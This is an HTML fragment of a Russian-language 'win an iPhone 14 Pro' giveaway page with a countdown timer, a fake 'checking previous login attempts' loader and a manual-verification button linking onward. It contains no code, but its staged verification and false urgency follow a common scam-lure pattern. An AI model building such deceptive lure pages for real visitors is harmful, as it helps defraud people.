  <body class="themeDark">
    <section class="verification" data-verification-wrapper>
      <div class="verification__wrapper wrapper">
        <div class="verification__img">
          <img src="./assets/img/verif.png" alt="" /><img src="./assets/img/verif2.png" alt="" />
        </div>

        <ul class="timer" data-timer>
          <p class="txt30x36 w900">Следующий розыгрыш:</p>
          <li class="timer__item">
            <p class="timer__num" data-timer-day>07</p>

          <li class="timer__item">
            <p class="timer__num" data-timer-hour>16</p>
            <p class="timer__name">часов</p>
          </li>
          <li class="timer__item">
            <p class="timer__num" data-timer-minute>39</p>
            <p class="timer__name">минут</p>
          </li>
          <li class="timer__item">
            <p class="timer__num" data-timer-sec>05</p>
            <p class="timer__name">секунд</p>
          </li>
        </ul>
        <div class="verification__cnt">
          <h1 class="txt50x60">
            Выиграй совершенно<br />
            новый <span class="cGradiend14">iPhone 14 Pro</span>

            <p class="txt20x30 w600 verification__subTitle">
              Пожалуйста, подождите, пока мы отправим вашу заявку
            </p>
            <div class="verification__anim">
              <div class="loader">
                <div></div>
                <div></div>
                <div></div>
                <div></div>
                <div></div>
                <div></div>
                <div></div>
                <div></div>
                <div></div>
                <div></div>
                <div></div>
                <div></div>
              </div>
              <p class="txt20x30 cDr" data-verification-text>
                Проверка предыдущих попыток входа...
              </p>
              <div class="verification__load">
                <span style="width: 20%" data-verification-load></span>
              </div>
            </div>
            <div class="verification__verfComlpite" data-verification-more>
              <p class="txt25x30 w800">Пройти верификацию вручную</p>
              <a href="https://pagas15.github.io/test/2/review.html" class="button">ПРОДОЛЖИТЬ</a>
